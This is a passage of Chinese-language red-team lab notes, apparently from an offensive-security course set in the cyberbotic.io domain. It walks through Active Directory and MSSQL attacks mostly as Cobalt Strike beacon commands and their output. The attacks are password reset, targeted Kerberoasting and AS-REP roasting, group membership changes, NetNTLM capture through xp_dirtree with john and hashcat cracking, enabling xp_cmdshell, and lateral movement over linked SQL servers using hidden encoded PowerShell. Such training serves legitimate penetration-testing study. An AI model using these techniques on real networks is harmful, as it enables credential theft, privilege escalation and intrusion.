[+] Impersonated DEV\bfarmer

beacon> run net user jadams N3wPassw0rd! /domain

The request will be processed at a domain controller for domain dev.cyberbotic.io.

The command completed successfully.
```

# Targeted Kerberoasting

我们可以在帐户上设置一个 SPN，对其进行 kerberoast 并尝试离线破解，而不是更改密码。

```
beacon> powershell Set-DomainObject -Identity jadams -Set @{serviceprincipalname="fake/NOTHING"}
beacon> powershell Get-DomainUser -Identity jadams -Properties ServicePrincipalName

serviceprincipalname
--------------------
fake/NOTHING

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe kerberoast /user:jadams /nowrap

[*] Action: Kerberoasting

[*] Target User            : jadams
[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 1

[*] SamAccountName         : jadams
[*] DistinguishedName      : CN=Joyce Adam,CN=Users,DC=dev,DC=cyberbotic,DC=io
[*] ServicePrincipalName   : fake/NOTHING
[*] PwdLastSet             : 3/10/2021 3:28:20 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT

[*] Hash                   : $krb5tgs$23$*jadams$dev.cyberbotic.io$fake/NOTHING*$7D84D4D25DD82A170B308A21FED2E1F5$B22A1E [...snip...] 56B2E7

beacon> powershell Set-DomainObject -Identity jadams -Clear ServicePrincipalName
```

# Targeted ASREPRoasting

与上面的思路类似。修改帐户上的用户帐户控制值以禁用预身份验证，然后 ASREProast 它

```
beacon> powershell Get-DomainUser -Identity jadams | ConvertFrom-UACValue

Name                           Value                                                     
----                           -----                                                     NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536

beacon> powershell Set-DomainObject -Identity jadams -XOR @{UserAccountControl=4194304}
beacon> powershell Get-DomainUser -Identity jadams | ConvertFrom-UACValue

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512                              
DONT_EXPIRE_PASSWORD           65536                              
DONT_REQ_PREAUTH               4194304

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asreproast /user:jadams /nowrap

[*] Action: AS-REP roasting

[*] Target User            : jadams
[*] Target Domain          : dev.cyberbotic.io

[*] Searching path 'LDAP://dc-2.dev.cyberbotic.io/DC=dev,DC=cyberbotic,DC=io' for AS-REP roastable users

[*] SamAccountName         : jadams
[*] DistinguishedName      : CN=Joyce Adams,CN=Users,DC=dev,DC=cyberbotic,DC=io
[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Building AS-REQ (w/o preauth) for: 'dev.cyberbotic.io\jadams'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$jadams@dev.cyberbotic.io:5E0549 [...snip...] 131FDC

beacon> powershell Set-DomainObject -Identity jadams -XOR @{UserAccountControl=4194304}
beacon> powershell Get-DomainUser -Identity jadams | ConvertFrom-UACValue

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536
```

# Modify Domain Group Membership

如果我们对域里的某个组上有 ACL，我们可以添加和删除组成员
```
beacon> run net group "Oracle Admins" bfarmer /add /domain

The request will be processed at a domain controller for domain dev.cyberbotic.io.

The command completed successfully.

beacon> run net user bfarmer /domain

The request will be processed at a domain controller for domain dev.cyberbotic.io.

User name                    bfarmer
Full Name                    Bob Farmer

[...snip...]

Global Group memberships     *Domain Users         *Roaming Users        
                             *Developers           *Oracle Admins
```


# MS SQL Servers

MSSQL除了信息数据窃取以外还有很大的攻击面，包括：代码执行，权限提升，横向移动，权限维持

使用工具：[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)


查找MSSQL实例的cmdlets
```
Get-SQLInstanceDomain
Get-SQLInstanceBroadcast
Get-SQLInstanceScanUDP
```

例子:
```
beacon> getuid
[*] You are DEV\bfarmer

beacon> powershell Get-SQLInstanceDomain

ComputerName     : srv-1.dev.cyberbotic.io
Instance         : srv-1.dev.cyberbotic.io,1433
DomainAccountSid : 15000005210002361191261941702819312113313089172110400
DomainAccount    : svc_mssql
DomainAccountCn  : MS SQL Service
Service          : MSSQLSvc
Spn              : MSSQLSvc/srv-1.dev.cyberbotic.io:1433
LastLogon        : 5/14/2021 2:24 PM
Description      : 
```

BloodHound等价操作，甚至可以查找潜在的mssql管理员
```
MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) RETURN p
```

``` Get-SQLConnectionTest```查找是否可以连接数据库
```
beacon> powershell Get-SQLConnectionTest -Instance "srv-1.dev.cyberbotic.io,1433" | fl

ComputerName : srv-1.dev.cyberbotic.io
Instance     : srv-1.dev.cyberbotic.io,1433
Status       : Accessible
```

```Get-SQLServerInfo```命令收集更详细的连接实例信息
```
beacon> powershell Get-SQLServerInfo -Instance "srv-1.dev.cyberbotic.io,1433"

ComputerName           : srv-1.dev.cyberbotic.io
Instance               : SRV-1
DomainName             : DEV
ServiceProcessID       : 3960
ServiceName            : MSSQLSERVER
ServiceAccount         : DEV\svc_mssql
AuthenticationMode     : Windows Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 13.0.5026.0
SQLServerMajorVersion  : 2016
SQLServerEdition       : Standard Edition (64-bit)
SQLServerServicePack   : SP2
OSArchitecture         : X64
OsMachineType          : ServerNT
OSVersionName          : Windows Server 2016 Datacenter
OsVersionNumber        : SQL
Currentlogin           : DEV\bfarmer
IsSysadmin             : Yes
ActiveSessions         : 1
```

```Get-SQLQuery```执行sql命令
```
beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select @@servername"

Column1
-------
SRV-1 
```


```mssqlclient.py```连接mssql，需要账号密码
```
root@kali:~# proxychains python3 /usr/local/bin/mssqlclient.py -windows-auth DEV/bfarmer@10.10.17.25
```

GUI连接工具:[HeidiSQL](https://www.heidisql.com/)或者[SMSS](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms)

![alt GUI](https://rto-assets.s3.eu-west-2.amazonaws.com/sql-servers/heidi.png?width=1920)


# MSSQL NetNTLM Capture

通过mssql的xp_dirtree命令可以进行中继攻击

## 方法一

1. 监听
首先在本地监听，使用[InveighZero](https://github.com/Kevin-Robertson/InveighZero)进行监听，需要本地管理员权限
```
beacon> execute-assembly C:\Tools\InveighZero\Inveigh\bin\Debug\Inveigh.exe -DNS N -LLMNR N -LLMNRv6 N -HTTP N -FileOutput N
```
2. 触发
在mssql上，执行命令```EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1```，10.10.17.231的IP地址就是上面监听的机器

3. 收到NTML
监听机器收到的NTML应该是下面格式
```
[+] [2021-05-14T15:33:49] TCP(445) SYN packet from 10.10.17.25:50323
[+] [2021-05-14T15:33:49] SMB(445) negotiation request detected from 10.10.17.25:50323
[+] [2021-05-14T15:33:49] SMB(445) NTLM challenge 3006547FFC8E90D8 sent to 10.10.17.25:50323
[+] [2021-05-14T15:33:49] SMB(445) NTLMv2 captured for DEV\svc_mssql from 10.10.17.25(SRV-1):50323:
svc_mssql::DEV:[...snip...]
```

4. 破解
john
```
john --format=netntlmv2 --wordlist=wordlist svc_mssql-netntlmv2
```

hashcat
```
hashcat -a 0 -m 5600 svc_mssql-netntlmv2 wordlist
```

## 方法二

可以使用 WinDivert + rportfwd把smb流量转发到teamserver（就是kali机），然后再kali使用[smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py)监听，这个方法前面几章已经有展示。

监听
```
root@kali:~# python3 /usr/local/bin/smbserver.py -smb2support pwn .
```

# MSSQL Command Execution

MSSQL拥有执行系统命令能力

PowerUpSQL使用```Invoke-SQLOSCmd```命令

```
beacon> powershell Invoke-SQLOSCmd -Instance "srv-1.dev.cyberbotic.io,1433" -Command "whoami" -RawResults

dev\svc_mssql
```


原生MSSQL使用``` xp_cmdshell ```命令
```
EXEC xp_cmdshell 'whoami';
```
但不一定成功，有可能没有权限，或者没有开启xp_cmdshell,会收到类似如下报错

![alt shell](https://rto-assets.s3.eu-west-2.amazonaws.com/sql-servers/xp_cmdshell-disabled.png?width=1920)


查看xp_cmdshell是否开启
```
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```

value=0,表示没有开启

![alt value](https://rto-assets.s3.eu-west-2.amazonaws.com/sql-servers/sysconfigurations.png?width=1920)

开启xp_cmdshell功能
```
sp_configure 'Show Advanced Options', 1; RECONFIGURE; sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

执行powershell命令
```
EXEC xp_cmdshell 'powershell -w hidden -enc <blah>';
```

这里要注意：
1. sql命令可能有长度限制
2. sql服务器可能无法直接访问kali，需要转发和pivot监听



# MS SQL Lateral Movement

mssql支持多个源，包括其他SqlServer，这些SqlServer可能存在其他机器，域，或者林中。如此横向移动就成为可能。

1. 获取实例
## 方法一，手动抓取

枚举当前机器的mssql的实例
```
SELECT * FROM master..sysservers;
```

![alt sqlserver](https://rto-assets.s3.eu-west-2.amazonaws.com/sql-servers/srv1-link.png?width=1920)


可以利用上面的实例运行sql语句

```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');
```

**注意，上面实例使用双引号，sql语句使用单引号。**


查看某个实例是否有xp_cmdshell权限
```
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');
```

如果被禁用，开启xp_cmdshell
```
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [target instance]
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [target instance]
```

## 方法二，自动抓取 


使用```Get-SQLServerLinkCrawl```命令

```
beacon> powershell Get-SQLServerLinkCrawl -Instance "srv-1.dev.cyberbotic.io,1433"

Version     : SQL Server 2016 
Instance    : SRV-1
CustomQuery : 
Sysadmin    : 1
Path        : {SRV-1}
User        : DEV\bfarmer
Links       : {SQL-1.CYBERBOTIC.IO}

Version     : SQL Server 2016 
Instance    : SQL-1
CustomQuery : 
Sysadmin    : 1
Path        : {SRV-1, SQL-1.CYBERBOTIC.IO}
User        : sa
Links       : {SQL01.ZEROPOINTSECURITY.LOCAL}

Version     : SQL Server 2019 
Instance    : SQL01\SQLEXPRESS
CustomQuery : 
Sysadmin    : 1
Path        : {SRV-1, SQL-1.CYBERBOTIC.IO, SQL01.ZEROPOINTSECURITY.LOCAL}
User        : sa
Links       : 
```

留意上面的实例链：```SRV-1 > SQL-1.CYBERBOTIC.IO > SQL01.ZEROPOINTSECURITY.LOCAL```

2. 执行系统shell

在```sql-1.cyberbotic.io```实例上执行系统shell

```
SELECT * FROM OPENQUERY( "sql-1.cyberbotic.io" , 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''' )
```

在```sql01.zeropointsecurity.local```实例上执行系统shell

```
SELECT * FROM OPENQUERY( "sql-1.cyberbotic.io" , 'select * from openquery("sql01.zeropointsecurity.local", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''' '')' )
```